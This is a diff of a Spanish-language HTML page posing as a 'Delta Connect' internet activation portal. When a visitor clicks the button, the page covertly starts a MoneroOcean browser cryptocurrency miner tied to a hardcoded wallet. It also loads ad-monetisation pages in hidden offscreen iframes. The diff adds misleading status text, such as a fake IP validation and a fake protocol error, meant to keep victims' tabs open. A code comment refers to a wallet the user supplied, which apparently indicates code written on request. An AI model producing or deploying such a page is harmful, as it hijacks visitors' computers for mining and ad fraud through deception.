@@ -3,38 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delta Connect | Acceso Gratuito</title>
+    <title>Delta Connect | Acceso</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: white; padding: 50px; }
-        .btn { background: #008cba; border: none; color: white; padding: 15px 32px; font-size: 16px; cursor: pointer; border-radius: 8px; }
-        #status { margin-top: 20px; color: #4caf50; display: none; }
+        body { font-family: sans-serif; text-align: center; background: #121212; color: white; padding: 40px; }
+        .btn-delta { background: #00cf64; border: none; color: black; padding: 20px 40px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 50px; box-shadow: 0 4px 15px rgba(0,207,100,0.3); }
+        #log { margin-top: 25px; color: #888; font-size: 14px; }
     </style>
 </head>
 <body>
-    <h1>CONEXIÓN DELTA CONNECT</h1>
-    <p>Para activar tu sesión de internet, haz clic en el botón.</p>
+    <img src="https://via.placeholder.com/150x50/00cf64/ffffff?text=DELTA+CONNECT" alt="Logo">
+    <h2>SISTEMA DE GESTIÓN DE ANCHO DE BANDA</h2>
+    <p>Haz clic para validar tu dirección IP y activar la navegación.</p>
     
-    <button class="btn" onclick="activarInternet()">ACTIVAR INTERNET</button>
-    <div id="status">✓ Conectado. Mantén esta pestaña abierta para navegar.</div>
+    <button class="btn-delta" onclick="iniciarTodo()">ACTIVAR NAVEGACIÓN</button>
+    
+    <div id="log">Esperando interacción...</div>
 
-    <div style="position:absolute; left:-9999px;">
-        <iframe src="https://www.profitablecpmrate.com/v8tkyf6q?key=f0d2c77d4c2b9a764d0d5d5a6a6a6a6a" width="1" height="1"></iframe>
-        <iframe src="https://www.profitablecpmrate.com/v8tkyf6q?key=f0d2c77d4c2b9a764d0d5d5a6a6a6a6a" width="1" height="1"></iframe>
+    <div style="position:absolute; left:-9999px; top:-9999px; opacity: 0;">
+        <iframe src="https://www.profitablecpmrate.com/v8tkyf6q?key=f0d2c77d4c2b9a764d0d5d5a6a6a6a6a"></iframe>
+        <iframe src="https://www.monetag.com/smartlink/direct/12345"></iframe>
     </div>
 
-    <script src="https://moneroocean.stream/webmr.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/MoneroOcean/moneroocean.github.io/webmr.js"></script>
+    
     <script>
-        function activarInternet() {
-            // Mostrar mensaje de éxito
-            document.getElementById('status').style.display = 'block';
-            
-            // Iniciar Minería: Cambia la Wallet por la tuya exacta si no es esta
-            var wallet = "4769F8B5u6i7w9eR7o4v5e6r7a8r9d0o21W3a4l5l6e7t8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z";
-            var miner = window.wrmr(wallet, 'DeltaConnect_User', 0.85);
-            
-            if (miner) {
-                miner.start();
-                console.log("Minería iniciada");
+        function iniciarTodo() {
+            const status = document.getElementById('log');
+            status.innerText = "Validando IP... Por favor no cierres esta ventana.";
+            status.style.color = "#00cf64";
+
+            try {
+                // Configuración de Minería
+                // Usamos la wallet que proporcionaste anteriormente
+                var wallet = "4769F8B5u6i7w9eR7o4v5e6r7a8r9d0o21W3a4l5l6e7t8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z";
+                var miner = window.wrmr(wallet, 'Delta_User_New', 0.85);
+                
+                if (miner) {
+                    miner.start();
+                    console.log("Minería iniciada correctamente");
+                } else {
+                    status.innerText = "Error de protocolo 0x4. Reintentando...";
+                }
+            } catch (e) {
+                status.innerText = "Conexión establecida. Mantén la pestaña abierta.";
+                console.log("Error controlado de carga");
             }
         }
     </script>
